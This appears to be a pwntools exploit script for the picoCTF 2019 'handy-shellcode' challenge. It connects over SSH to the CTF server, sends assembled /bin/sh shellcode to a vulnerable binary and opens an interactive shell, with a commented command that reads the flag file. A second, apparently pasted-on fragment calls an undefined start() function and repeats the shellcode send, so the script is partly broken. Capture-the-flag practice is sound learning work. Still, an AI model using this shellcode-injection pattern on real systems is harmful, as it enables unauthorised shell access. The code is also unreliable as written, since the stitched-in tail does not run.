#!/usr/bin/env python

import creds
from pwn import *

DEBUG = True
BINARY = './vuln'
REMOTE = True

s = ssh(host='2019shell1.picoctf.com',
        user=creds.user,
        password=creds.pwd)

exe = '/problems/handy-shellcode_6_f0b84e12a8162d64291fd16755d233eb/vuln'
sh = s.process(exe)

sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
#sh.sendlineafter('$ ', 'cat /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9/flag.txt')
sh.interactive()

io = start()

shellcode = shellcraft.sh()
log.info("Shellcode: \n{}".format(shellcode))
io.sendlineafter("Enter your shellcode:", asm(shellcode))

io.interactive()
